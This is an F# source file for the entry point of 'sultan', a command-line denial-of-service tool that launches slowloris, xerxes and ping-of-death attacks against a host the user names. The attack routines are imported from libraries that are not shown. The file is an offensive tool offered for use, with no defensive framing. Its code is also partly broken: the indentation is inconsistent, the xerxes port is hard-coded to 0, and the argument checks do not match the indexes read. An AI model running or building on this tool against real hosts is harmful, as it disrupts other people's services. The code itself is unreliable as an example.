#nowarn "20"

open sultan
open sultan.printxlib
open sultan.xerxeslib
open sultan.pinglib

open System
open System.Threading

module sultan =

    let E : string = string (char 0x1B)
    let invoke_slowloris (args : string[]) =
        if args.Length < 2 then
                error "100 Target host not provided. Aborting."
                exit 1
                else verbose "starting...\n"
        let weapon = new sllib()
        weapon.attack(args.[1], System.Int32.Parse(args.[2]), false, System.Int32.Parse(args.[3]));
        Thread.Sleep(Timeout.Infinite);
        0

    let invoke_xerxes (args : string[]) =
            let connections = 0
            let port = 0
         if args.Length < 2 then
             error "200 Target host not provided. Aborting."
             exit 1
                else verbose "starting...\n"

            xerxeslib.attack args.[1] port 0 connections
            Thread.Sleep(Timeout.Infinite);
            0
    let invoke_pod (args : string array) =
        if args.Length < 2 then
                error "300 Target host or IP not provided. Aborting."
                exit 1
                else verbose "starting...\n"
        pinglib.attackp 1 args.[1]
        0


    let help =
        printfn "sultan v0.2.3"
        printfn "MIT (c) Kied Llaentenn\n"
        printfn "Usage: .\sultan slowloris [host] [port] [socket_count]"
        printfn "Usage: .\sultan xerxes [host] [port (default: 80)]"
        printfn "Usage: .\sultan deathping [host]"

    [<EntryPoint>]
    let main argv =
        consoletool.enableVTMode() |> ignore
        // go nuts if there aren't enough args
        if argv.Length < 1 then
            help
            error "001 Not enough arguments. Aborting."
            exit 1
        else

        if (argv.[0]).Equals("slowloris") then invoke_slowloris argv
        elif (argv.[0]).Equals("xerxes") then invoke_xerxes argv
        elif (argv.[0]).Equals("deathping") then invoke_pod argv else 0
        0

